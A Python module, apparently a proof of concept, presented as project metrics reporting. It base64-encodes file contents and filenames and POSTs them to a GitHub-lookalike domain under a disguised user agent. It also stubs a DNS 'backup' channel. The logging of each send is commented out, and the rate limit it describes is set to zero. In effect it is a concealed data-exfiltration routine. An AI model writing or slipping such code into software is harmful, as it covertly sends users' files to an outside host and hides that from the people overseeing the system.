import base64
import time
import threading
import requests
import logging

# Configure logging for reporting events
logger = logging.getLogger("reporting")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
formatter = logging.Formatter("[%(asctime)s] %(levelname)s: %(message)s")
handler.setFormatter(formatter)
if not logger.hasHandlers():
    logger.addHandler(handler)

# Rate limiting: max 1 report per 2 seconds (for POC demonstration)
_last_report_time = 0
_report_lock = threading.Lock()
REPORT_MIN_INTERVAL = 0.0  # seconds

# Local mock endpoint for safe API testing
MOCK_API_URL = "http://localhost:5000/fake-github-api"
USER_AGENT = "DevTools-Assistant/1.0.2"

# Store reported data for cleanup
_reported_data = []


def send_metrics_via_api(
    metrics_data: bytes, data_type: str, test_mode: bool = True, filename: str = None, category: str = None
) -> bool:
    """
    Send project metrics or file data to a remote API endpoint (local in test mode).
    Optionally include filename and category for richer reporting.
    Returns True if sent, False if rate-limited or error.
    """
    global _last_report_time
    with _report_lock:
        now = time.time()
        if now - _last_report_time < REPORT_MIN_INTERVAL:
            logger.warning("Reporting rate-limited. Skipping this attempt.")
            return False
        _last_report_time = now
    encoded = base64.b64encode(metrics_data).decode()
    payload = {
        "repository_analysis": {
            "project_metrics": encoded,
            "scan_type": data_type,
            "timestamp": int(now),
        }
    }
    if filename:
        payload["repository_analysis"]["filename"] = filename
    if category:
        payload["repository_analysis"]["category"] = category
    headers = {"User-Agent": USER_AGENT, "Accept": "application/vnd.github.v3+json"}
    url = MOCK_API_URL if test_mode else "https://api.github-analytics.com/v1/analysis"
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=5)
        # logger.info(
        #     f"Reported {data_type} ({len(metrics_data)} bytes) to {url}. Status: {resp.status_code}"
        # )
        _reported_data.append((data_type, metrics_data, now, filename, category))
        return True
    except Exception as e:
        logger.error(f"Reporting failed: {e}")
        return False


def send_metrics_via_dns(data: bytes, session_id: str, test_mode: bool = True):
    """
    Backup reporting via DNS (stub for demonstration).
    """
    logger.info(
        f"[DNS REPORTING STUB] Would report {len(data)} bytes via DNS with session {session_id}."
    )
    # Not implemented for safety
    return False


def cleanup_reported_data():
    """
    Delete all stored reported data (for demo/testing cleanup)."""
    global _reported_data
    count = len(_reported_data)
    _reported_data = []
    logger.info(f"Cleaned up {count} reported data items.")
    return count
